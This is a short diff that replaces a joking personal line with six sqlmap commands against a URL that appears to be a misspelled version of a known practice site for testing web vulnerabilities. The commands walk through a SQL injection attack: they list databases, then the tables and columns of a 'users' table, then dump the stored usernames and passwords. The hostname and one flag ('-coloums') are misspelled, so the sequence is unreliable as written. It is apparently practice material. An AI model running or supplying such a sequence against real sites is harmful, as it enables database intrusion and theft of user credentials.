@@ -1,1 +1,6 @@
-hello my name is Dhrvu and i am not a terrorist
+sqlmap -u https://testphp.bulnweb.com/listproduct.php?cat=1 --dbs
+sqlmap -u https://testphp.bulnweb.com/listproduct.php?cat=1 -D acuart
+sqlmap -u https://testphp.bulnweb.com/listproduct.php?cat=1 -D acuart --tables
+sqlmap -u https://testphp.bulnweb.com/listproduct.php?cat=1 -D acuart -T users -coloums
+sqlmap -u https://testphp.bulnweb.com/listproduct.php?cat=1 -D acuart -T users -C uname --dump
+sqlmap -u https://testphp.bulnweb.com/listproduct.php?cat=1 -D acuart -T users -C pass --dump
